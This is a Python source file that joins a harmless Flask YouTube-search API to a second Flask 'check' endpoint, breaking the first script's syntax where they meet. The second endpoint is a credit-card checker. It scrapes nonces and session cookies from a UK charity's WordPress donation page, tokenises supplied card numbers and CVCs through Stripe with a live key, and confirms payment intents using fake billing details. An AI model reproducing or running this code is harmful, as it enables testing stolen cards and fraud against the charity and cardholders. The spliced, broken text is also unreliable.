import os
import requests
from flask import *
from youtubesearchpython import VideosSearch
app = Flask(__name__)
app.config["JSONIFY_PRETTYPRINT_REGULAR"] = True
@app.route("/search=<search>")
def ue(search):
	se = VideosSearch(search, limit=5)
	r = (se.result()).get("result")
	v1 = r[0]["title"]
	v2 = r[1]["title"]
	v3 = r[2]["title"]
	v4 = r[3]["title"]
	v5 = r[4]["title"]
	link_v1 = r[0]["id"]
	link_v2 = r[1]["id"]
	link_v3 = r[2]["id"]
	link_v4 = r[3]["id"]
	link_v5 = r[4]["id"]
	photo1 = r[0]['thumbnails'][0]['url']
	photo2 = r[1]['thumbnails'][0]['url']
	photo3 = r[2]['thumbnails'][0]['url']
	photo4 = r[3]['thumbnails'][0]['url']
	photo5 = r[4]['thumbnails'][0]['url']
	msg = {
		"title_1": f"{v1}",
		"link_video_1": f"https://youtu.be/{link_v1}",
		"image_1": f"{photo1}",
		"title_2": f"{v2}",
		"link_video_2": f"https://www.youtube.com/watch?v={link_v2}",
		"image_2": f"{photo2}",
		"title_3": f"{v3}",
		"link_video_3": f"https://www.youtube.com/watch?v={link_v3}",
		"image_3": f"{photo3}",
		"title_4": f"{v4}",
		"link_video_4": f"https://www.youtube.com/watch?v={link_v4}",
		"image_4": f"{photo4}",
		"title_5": f"{v5}",
		"link_video_5": f"https://www.youtube.com/watch?v={link_v5}",
		"image_5": f"{photo5}",
		}
	return msg
if __name__ =="__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)

from flask import *

api = Flask(__name__)

@api.route("/check/cc=<cc>&mm=<mm>&yy=<yy>&cvc=<cv>")

def check(cc,mm,yy,cv):

		url = "https://www.thebevy.co.uk/asp-payment-box/?product_id=242274"

		headers= {

"user-agent": "Mozilla/5.0 (Linux; Android 11; ZTE A7030) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36",

"referer": "https://www.thebevy.co.uk/donate/"}

		non = requests.get(url,headers=headers)

		nonc = non.text

		nonce = nonc.split('"asp_pp_ajax_create_pi_nonce":"')[1].split('"')[0]

		nonce1 = nonc.split('"asp_pp_ajax_nonce":"')[1].split('"')[0]

		token = "2c65f8590f5d1b70fecafad5e53b046a"

		asp = non.cookies["asp_transient_id"]

		ph = non.cookies["PHPSESSID"]

		

		url = "https://www.thebevy.co.uk/wp-admin/admin-ajax.php"

		data = 'action=asp_pp_create_pi&nonce='+nonce+'&amount=500&curr=GBP&product_id=242274&quantity=1&billing_details={"name":"Miko Miko","email":"mikomiko11332244%40gmail.com","address":{"line1":"west spring","city":"New York","state":null,"country":"US","postal_code":"10009"}}&token=bc9fbf304b51a7d16d72320becd67742'

		headers = {

"content-type": "application/x-www-form-urlencoded",

"origin": "https://www.thebevy.co.uk",

"referer": "https://www.thebevy.co.uk/asp-payment-box/?product_id=242274",

"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36 Edg/104.0.1293.54"}

		pp =requests.post(url,headers=headers,data=data)

		pi = pp.json()["pi_id"]

		data =f"card[name]=dark&card[address_line1]=lidtali+248&card[address_city]=dkklef&card[address_state]=&card[address_zip]=10080&card[address_country]=US&card[number]={cc}&card[cvc]={cv}&card[exp_month]={mm}&card[exp_year]={yy}&guid=f8187b9b-b6a5-4267-99a7-9963a55e3b4fd1d196&muid=1ef3617b-c916-4ad7-b404-99ae7790fd8e06c0e8&sid=930c6420-2092-4e88-8806-181854585cee9d6c27&payment_user_agent=stripe.js%2F49e79370c%3B+stripe-js-v3%2F49e79370c&time_on_page=127611&key=pk_live_1nXwtICYYC0KSSj5ebJ2DMkA00WgmmzEIs&_stripe_version=2020-03-02&pasted_fields=number"

		url ="https://api.stripe.com/v1/tokens"

		header = {

"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36 Edg/104.0.1293.54"

}

		tokn =requests.post(url,headers=header,data=data)

		

		if '"error":' in tokn.text:	

		

			return tokn.json()

		else:

		

			token = tokn.json()["id"]

		

		

			headers = {

"content-type": "application/x-www-form-urlencoded",

"origin": "https://www.thebevy.co.uk",

"referer": "https://www.thebevy.co.uk/asp-payment-box/?product_id=242274",

"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36 Edg/104.0.1293.54",

"cookie": "asp_transient_id="+asp,

"cookie": "PHPSESSID="+ph}

			url = "https://www.thebevy.co.uk/wp-admin/admin-ajax.php"

			data ='action=asp_pp_confirm_pi&nonce='+nonce1+'&product_id=242274&pi_id='+pi+'&token=bc9fbf304b51a7d16d72320becd67742&opts={"save_payment_method":true,"setup_future_usage":"off_session","payment_method_data":{"type":"card","card":{"token":"'+token+'"}}}'

			result =requests.post(url,headers=headers,data=data).text

			return result

api.run(host="0.0.0.0",port=5000)
